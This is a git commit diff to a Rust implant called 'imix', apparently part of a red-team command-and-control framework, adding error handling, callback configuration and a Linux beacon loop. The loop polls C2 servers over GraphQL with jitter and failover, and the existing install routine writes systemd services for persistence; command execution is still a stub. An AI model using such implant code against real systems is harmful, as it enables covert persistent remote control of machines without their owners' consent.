7100a29c1cbec9cedb64b3bdcc932bd8624bcad5
Nicholas OBrien <ndo9903@rit.edu>
2022-02-17 05:47:00 +0000

    added a ton fo logic for the initial call back, also errors!

--- cmd/imix/src/lib.rs
+++ cmd/imix/src/lib.rs
@@ -1,12 +1,48 @@
 use serde::{Serialize, Deserialize};
 
-#[derive(Serialize, Deserialize)]
+#[derive(Debug)]
+pub enum Error {
+    Io(std::io::Error),
+    HyperInvalidUri(hyper::http::uri::InvalidUri),
+    HyperHttp(hyper::http::Error),
+    Hyper(hyper::Error),
+    SerdeJson(serde_json::Error)
+}
+
+impl From<std::io::Error> for Error {
+    fn from(error: std::io::Error) -> Self {
+        Error::Io(error)
+    }
+}
+
+impl From<hyper::http::uri::InvalidUri> for Error {
+    fn from(error: hyper::http::uri::InvalidUri) -> Self {
+        Error::HyperInvalidUri(error)
+    }
+}
+
+impl From<hyper::http::Error> for Error {
+    fn from(error: hyper::http::Error) -> Self {
+        Error::HyperHttp(error)
+    }
+}
+
+impl From<hyper::Error> for Error {
+    fn from(error: hyper::Error) -> Self {
+        Error::Hyper(error)
+    }
+}
+
+impl From<serde_json::Error> for Error {
+    fn from(error: serde_json::Error) -> Self {
+        Error::SerdeJson(error)
+    }
+}
+
+#[derive(Serialize, Deserialize, Clone)]
 pub struct C2Config {
     uri: String,
-    timeout: u32,
     priority: u8,
-    sticky: bool,
-    failsafe: bool
 }
 
 #[derive(Serialize, Deserialize)]
@@ -17,13 +53,21 @@ pub struct ServiceConfig {
 }
 
 #[derive(Serialize, Deserialize)]
+pub struct CallbackConfig {
+    interval: u64,
+    jitter: u64,
+    timeout: u64,
+    c2_configs: Vec<C2Config>,
+}
+
+#[derive(Serialize, Deserialize)]
 pub struct Config {
     target_name: String,
-    callback_interval: u32,
-    callback_jitter: u32,
-    c2_configs: Vec<C2Config>,
+    target_forward_connect_ip: String,
+    callback_config: CallbackConfig,
     service_configs: Vec<ServiceConfig>,
 }
 
 pub mod windows;
 pub mod linux;
+pub mod graphql;
--- cmd/imix/src/linux.rs
+++ cmd/imix/src/linux.rs
@@ -1,9 +1,10 @@
-use std::fs;
+use std::{fs, thread, time};
+use rand::Rng;
 use std::process::Command;
 
 pub const SYSTEMD_DIR: &str = "/lib/systemd/system/";
 
-pub fn install(config: super::Config)-> std::io::Result<()> {
+pub async fn install(config: super::Config)-> Result<(), super::Error> {
     // go through each service config consuming the structs
     for service_config in config.service_configs.into_iter() {
         let service_name = service_config.name;
@@ -56,4 +57,44 @@ WantedBy=multi-user.target
         Command::new("systemctl").arg("start").arg(&service_name).output()?;
     }
     Ok(())
+}
+
+async fn exec(_response: super::graphql::GraphQLResponse) -> Result<(), super::Error> {
+    unimplemented!("this is where i would exec a tome... if i had one!")
+}
+
+pub async fn run(config: super::Config) -> Result<(), super::Error> {
+    println!("Linux run!");
+    let mut c2_index = 0;
+    let callback_config = config.callback_config;
+    let interval = callback_config.interval;
+    let jitter = callback_config.jitter;
+
+    loop {
+        loop {
+            let c2_config = callback_config.c2_configs[c2_index].clone();
+            
+            // TODO: do something with c2_config and pass in for graphql
+            let resp = match super::graphql::call(
+                String::from("variables"), 
+                c2_config.uri.clone(), 
+                callback_config.timeout
+            ).await {
+                Ok(r) => r,
+                Err(_) => {
+                    c2_index = (c2_index + 1) % callback_config.c2_configs.len();
+                    // wait 5 second between failovers
+                    thread::sleep(time::Duration::from_secs(5));
+                    continue;
+                },
+            };
+            exec(resp).await?;
+            break;
+        }
+
+        // sleep for interval - jitter delta
+        let mut rng = rand::thread_rng();
+        let delta = rng.gen_range(0..jitter);
+        thread::sleep(time::Duration::from_secs(interval-delta));
+    }
 }
